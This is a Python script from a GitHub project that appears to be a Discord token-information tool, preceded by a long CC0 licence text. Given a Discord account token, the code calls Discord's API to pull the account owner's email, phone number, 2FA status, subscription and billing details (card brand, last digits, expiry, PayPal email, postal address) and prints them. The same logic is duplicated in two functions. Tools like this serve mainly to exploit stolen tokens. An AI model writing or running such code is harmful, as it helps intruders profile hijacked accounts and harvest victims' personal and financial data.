"""
Author: suegdu | suegdu Industries
Source: https://github.com/suegdu/NT-RTE
Github: https://github.com/suegdu/NT-RTE
The NT SubxDTi function are written under this file SubxDTI.py
Remark that this file is a modified third party program, created and abandoned by github.com/wodxgod over 2 years. without a valuable license, now its gathered and handled by NT
it is licensed under the CC0 1.0 Universal license


Creative Commons Legal Code

CC0 1.0 Universal

    CREATIVE COMMONS CORPORATION IS NOT A LAW FIRM AND DOES NOT PROVIDE
    LEGAL SERVICES. DISTRIBUTION OF THIS DOCUMENT DOES NOT CREATE AN
    ATTORNEY-CLIENT RELATIONSHIP. CREATIVE COMMONS PROVIDES THIS
    INFORMATION ON AN "AS-IS" BASIS. CREATIVE COMMONS MAKES NO WARRANTIES
    REGARDING THE USE OF THIS DOCUMENT OR THE INFORMATION OR WORKS
    PROVIDED HEREUNDER, AND DISCLAIMS LIABILITY FOR DAMAGES RESULTING FROM
    THE USE OF THIS DOCUMENT OR THE INFORMATION OR WORKS PROVIDED
    HEREUNDER.

Statement of Purpose

The laws of most jurisdictions throughout the world automatically confer
exclusive Copyright and Related Rights (defined below) upon the creator
and subsequent owner(s) (each and all, an "owner") of an original work of
authorship and/or a database (each, a "Work").

Certain owners wish to permanently relinquish those rights to a Work for
the purpose of contributing to a commons of creative, cultural and
scientific works ("Commons") that the public can reliably and without fear
of later claims of infringement build upon, modify, incorporate in other
works, reuse and redistribute as freely as possible in any form whatsoever
and for any purposes, including without limitation commercial purposes.
These owners may contribute to the Commons to promote the ideal of a free
culture and the further production of creative, cultural and scientific
works, or to gain reputation or greater distribution for their Work in
part through the use and efforts of others.

For these and/or other purposes and motivations, and without any
expectation of additional consideration or compensation, the person
associating CC0 with a Work (the "Affirmer"), to the extent that he or she
is an owner of Copyright and Related Rights in the Work, voluntarily
elects to apply CC0 to the Work and publicly distribute the Work under its
terms, with knowledge of his or her Copyright and Related Rights in the
Work and the meaning and intended legal effect of CC0 on those rights.

1. Copyright and Related Rights. A Work made available under CC0 may be
protected by copyright and related or neighboring rights ("Copyright and
Related Rights"). Copyright and Related Rights include, but are not
limited to, the following:

  i. the right to reproduce, adapt, distribute, perform, display,
     communicate, and translate a Work;
 ii. moral rights retained by the original author(s) and/or performer(s);
iii. publicity and privacy rights pertaining to a person's image or
     likeness depicted in a Work;
 iv. rights protecting against unfair competition in regards to a Work,
     subject to the limitations in paragraph 4(a), below;
  v. rights protecting the extraction, dissemination, use and reuse of data
     in a Work;
 vi. database rights (such as those arising under Directive 96/9/EC of the
     European Parliament and of the Council of 11 March 1996 on the legal
     protection of databases, and under any national implementation
     thereof, including any amended or successor version of such
     directive); and
vii. other similar, equivalent or corresponding rights throughout the
     world based on applicable law or treaty, and any national
     implementations thereof.

2. Waiver. To the greatest extent permitted by, but not in contravention
of, applicable law, Affirmer hereby overtly, fully, permanently,
irrevocably and unconditionally waives, abandons, and surrenders all of
Affirmer's Copyright and Related Rights and associated claims and causes
of action, whether now known or unknown (including existing as well as
future claims and causes of action), in the Work (i) in all territories
worldwide, (ii) for the maximum duration provided by applicable law or
treaty (including future time extensions), (iii) in any current or future
medium and for any number of copies, and (iv) for any purpose whatsoever,
including without limitation commercial, advertising or promotional
purposes (the "Waiver"). Affirmer makes the Waiver for the benefit of each
member of the public at large and to the detriment of Affirmer's heirs and
successors, fully intending that such Waiver shall not be subject to
revocation, rescission, cancellation, termination, or any other legal or
equitable action to disrupt the quiet enjoyment of the Work by the public
as contemplated by Affirmer's express Statement of Purpose.

3. Public License Fallback. Should any part of the Waiver for any reason
be judged legally invalid or ineffective under applicable law, then the
Waiver shall be preserved to the maximum extent permitted taking into
account Affirmer's express Statement of Purpose. In addition, to the
extent the Waiver is so judged Affirmer hereby grants to each affected
person a royalty-free, non transferable, non sublicensable, non exclusive,
irrevocable and unconditional license to exercise Affirmer's Copyright and
Related Rights in the Work (i) in all territories worldwide, (ii) for the
maximum duration provided by applicable law or treaty (including future
time extensions), (iii) in any current or future medium and for any number
of copies, and (iv) for any purpose whatsoever, including without
limitation commercial, advertising or promotional purposes (the
"License"). The License shall be deemed effective as of the date CC0 was
applied by Affirmer to the Work. Should any part of the License for any
reason be judged legally invalid or ineffective under applicable law, such
partial invalidity or ineffectiveness shall not invalidate the remainder
of the License, and in such case Affirmer hereby affirms that he or she
will not (i) exercise any of his or her remaining Copyright and Related
Rights in the Work or (ii) assert any associated claims and causes of
action with respect to the Work, in either case contrary to Affirmer's
express Statement of Purpose.

4. Limitations and Disclaimers.

 a. No trademark or patent rights held by Affirmer are waived, abandoned,
    surrendered, licensed or otherwise affected by this document.
 b. Affirmer offers the Work as-is and makes no representations or
    warranties of any kind concerning the Work, express, implied,
    statutory or otherwise, including without limitation warranties of
    title, merchantability, fitness for a particular purpose, non
    infringement, or the absence of latent or other defects, accuracy, or
    the present or absence of errors, whether or not discoverable, all to
    the greatest extent permissible under applicable law.
 c. Affirmer disclaims responsibility for clearing rights of other persons
    that may apply to the Work or any use thereof, including without
    limitation any person's Copyright and Related Rights in the Work.
    Further, Affirmer disclaims responsibility for obtaining any necessary
    consents, permissions or other rights required for any use of the
    Work.
 d. Affirmer understands and acknowledges that Creative Commons is not a
    party to this document and has no duty or obligation with respect to
    this CC0 or use of the Work.
    
"""
import requests
from datetime import datetime
from colorama import Fore, init

__version__ = 1.9

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}

def main(token):
    init(convert=True) # makes console support ANSI escape color codes
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

        if res.status_code == 200: # code 200 if valid

            # user info
            res_json = res.json()

            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json['id']
            avatar_id = res_json['avatar']
            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
            phone_number = res_json['phone']
            email = res_json['email']
            mfa_enabled = res_json['mfa_enabled']
            flags = res_json['flags']
            locale = res_json['locale']
            verified = res_json['verified']
            
            language = languages.get(locale)

            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

            has_nitro = False
            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)
            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)

            # billing info
            billing_info = []
            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                y = x['billing_address']
                name = y['name']
                address_1 = y['line_1']
                address_2 = y['line_2']
                city = y['city']
                postal_code = y['postal_code']
                state = y['state']
                country = y['country']

                if x['type'] == 1:
                    cc_brand = x['brand']
                    cc_first = cc_digits.get(cc_brand)
                    cc_last = x['last_4']
                    cc_month = str(x['expires_month'])
                    cc_year = str(x['expires_year'])
                    
                    data = {
                        'Payment Type': 'Credit Card',
                        'Valid': not x['invalid'],
                        'CC Holder Name': name,
                        'CC Brand': cc_brand.title(),
                        'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                        'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment Method': x['default']
                    }

                elif x['type'] == 2:
                    data = {
                        'Payment Type': 'PayPal',
                        'Valid': not x['invalid'],
                        'PayPal Name': name,
                        'PayPal Email': x['email'],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment Method': x['default']
                    }

                billing_info.append(data)

            print('Basic Information')
            print('-----------------')
            print(f'    {Fore.RESET}Username               {Fore.GREEN}{user_name}')
            print(f'    {Fore.RESET}User ID                {Fore.GREEN}{user_id}')
            print(f'    {Fore.RESET}Creation Date          {Fore.GREEN}{creation_date}')
            print(f'    {Fore.RESET}Avatar URL             {Fore.GREEN}{avatar_url if avatar_id else ""}')
            print(f'    {Fore.RESET}Token                  {Fore.GREEN}{token}')
            print(f'{Fore.RESET}\n')
            
            print('Nitro Information')
            print('-----------------')
            print(f'    {Fore.RESET}Nitro Status           {Fore.MAGENTA}{has_nitro}')
            if has_nitro:
                print(f'    {Fore.RESET}Expires in             {Fore.MAGENTA}{days_left} day(s)')
            print(f'{Fore.RESET}\n')


            print('Contact Information')
            print('-------------------')
            print(f'    {Fore.RESET}Phone Number           {Fore.YELLOW}{phone_number if phone_number else ""}')
            print(f'    {Fore.RESET}Email                  {Fore.YELLOW}{email if email else ""}')
            print(f'{Fore.RESET}\n')

            if len(billing_info) > 0:
                print('Billing Information')
                print('-------------------')
                if len(billing_info) == 1:
                    for x in billing_info:
                        for key, val in x.items():
                            if not val:
                                continue
                            print(Fore.RESET + '    {:<23}{}{}'.format(key, Fore.CYAN, val))
                else:
                    for i, x in enumerate(billing_info):
                        title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                        print('    ' + title)
                        print('    ' + ('=' * len(title)))
                        for j, (key, val) in enumerate(x.items()):
                            if not val or j == 0:
                                continue
                            print(Fore.RESET + '        {:<23}{}{}'.format(key, Fore.CYAN, val))
                        if i < len(billing_info) - 1:
                            print(f'{Fore.RESET}\n')
                print(f'{Fore.RESET}\n')

            print('Account Security')
            print('----------------')
            print(f'    {Fore.RESET}2FA/MFA Enabled        {Fore.BLUE}{mfa_enabled}')
            print(f'    {Fore.RESET}Flags                  {Fore.BLUE}{flags}')
            print(f'{Fore.RESET}\n')

            print('Other')
            print('-----')
            print(f'    {Fore.RESET}Locale                 {Fore.RED}{locale} ({language})')
            print(f'    {Fore.RESET}Email Verified         {Fore.RED}{verified}')

        elif res.status_code == 401: # code 401 if invalid
            print(f'{Fore.RED}[-] {Fore.RESET}Invalid token')

        else:
            print(f'{Fore.RED}[-] {Fore.RESET}An error occurred while sending request')
    except:
        print(f'{Fore.RED}[-] {Fore.RESET}An error occurred while getting request')
def main2():
    print()
    token = input("[Enter a valid DT]:> ")
    if token=="":
        
        main2()
    elif token==" ":
        main2()
    else:

     init(convert=True) # makes console support ANSI escape color codes
     try:
         headers = {
             'Authorization': token,
             'Content-Type': 'application/json'
         }
 
         res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
 
         if res.status_code == 200: # code 200 if valid
 
             # user info
             res_json = res.json()
 
             user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
             user_id = res_json['id']
             avatar_id = res_json['avatar']
             avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
             phone_number = res_json['phone']
             email = res_json['email']
             mfa_enabled = res_json['mfa_enabled']
             flags = res_json['flags']
             locale = res_json['locale']
             verified = res_json['verified']
             
             language = languages.get(locale)
 
             creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
 
             has_nitro = False
             res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
             nitro_data = res.json()
             has_nitro = bool(len(nitro_data) > 0)
             if has_nitro:
                 d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                 d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                 days_left = abs((d2 - d1).days)
 
             # billing info
             billing_info = []
             for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                 y = x['billing_address']
                 name = y['name']
                 address_1 = y['line_1']
                 address_2 = y['line_2']
                 city = y['city']
                 postal_code = y['postal_code']
                 state = y['state']
                 country = y['country']
 
                 if x['type'] == 1:
                     cc_brand = x['brand']
                     cc_first = cc_digits.get(cc_brand)
                     cc_last = x['last_4']
                     cc_month = str(x['expires_month'])
                     cc_year = str(x['expires_year'])
                     
                     data = {
                         'Payment Type': 'Credit Card',
                         'Valid': not x['invalid'],
                         'CC Holder Name': name,
                         'CC Brand': cc_brand.title(),
                         'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                         'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                         'Address 1': address_1,
                         'Address 2': address_2 if address_2 else '',
                         'City': city,
                         'Postal Code': postal_code,
                         'State': state if state else '',
                         'Country': country,
                         'Default Payment Method': x['default']
                     }
 
                 elif x['type'] == 2:
                     data = {
                         'Payment Type': 'PayPal',
                         'Valid': not x['invalid'],
                         'PayPal Name': name,
                         'PayPal Email': x['email'],
                         'Address 1': address_1,
                         'Address 2': address_2 if address_2 else '',
                         'City': city,
                         'Postal Code': postal_code,
                         'State': state if state else '',
                         'Country': country,
                         'Default Payment Method': x['default']
                     }
 
                 billing_info.append(data)
 
             print('Basic Information')
             print('-----------------')
             print(f'    {Fore.RESET}Username               {Fore.GREEN}{user_name}')
             print(f'    {Fore.RESET}User ID                {Fore.GREEN}{user_id}')
             print(f'    {Fore.RESET}Creation Date          {Fore.GREEN}{creation_date}')
             print(f'    {Fore.RESET}Avatar URL             {Fore.GREEN}{avatar_url if avatar_id else ""}')
             print(f'    {Fore.RESET}Token                  {Fore.GREEN}{token}')
             print(f'{Fore.RESET}\n')
             
             print('Nitro Information')
             print('-----------------')
             print(f'    {Fore.RESET}Nitro Status           {Fore.MAGENTA}{has_nitro}')
             if has_nitro:
                 print(f'    {Fore.RESET}Expires in             {Fore.MAGENTA}{days_left} day(s)')
             print(f'{Fore.RESET}\n')
 
 
             print('Contact Information')
             print('-------------------')
             print(f'    {Fore.RESET}Phone Number           {Fore.YELLOW}{phone_number if phone_number else ""}')
             print(f'    {Fore.RESET}Email                  {Fore.YELLOW}{email if email else ""}')
             print(f'{Fore.RESET}\n')
 
             if len(billing_info) > 0:
                 print('Billing Information')
                 print('-------------------')
                 if len(billing_info) == 1:
                     for x in billing_info:
                         for key, val in x.items():
                             if not val:
                                 continue
                             print(Fore.RESET + '    {:<23}{}{}'.format(key, Fore.CYAN, val))
                 else:
                     for i, x in enumerate(billing_info):
                         title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                         print('    ' + title)
                         print('    ' + ('=' * len(title)))
                         for j, (key, val) in enumerate(x.items()):
                             if not val or j == 0:
                                 continue
                             print(Fore.RESET + '        {:<23}{}{}'.format(key, Fore.CYAN, val))
                         if i < len(billing_info) - 1:
                             print(f'{Fore.RESET}\n')
                 print(f'{Fore.RESET}\n')
 
             print('Account Security')
             print('----------------')
             print(f'    {Fore.RESET}2FA/MFA Enabled        {Fore.BLUE}{mfa_enabled}')
             print(f'    {Fore.RESET}Flags                  {Fore.BLUE}{flags}')
             print(f'{Fore.RESET}\n')
 
             print('Other')
             print('-----')
             print(f'    {Fore.RESET}Locale                 {Fore.RED}{locale} ({language})')
             print(f'    {Fore.RESET}Email Verified         {Fore.RED}{verified}')
 
         elif res.status_code == 401: # code 401 if invalid
             print(f'{Fore.RED}[-] {Fore.RESET}Invalid token')
 
         else:
             print(f'{Fore.RED}[-] {Fore.RESET}An error occurred while sending request')
     except:
         print(f'{Fore.RED}[-] {Fore.RESET}An error occurred while getting request')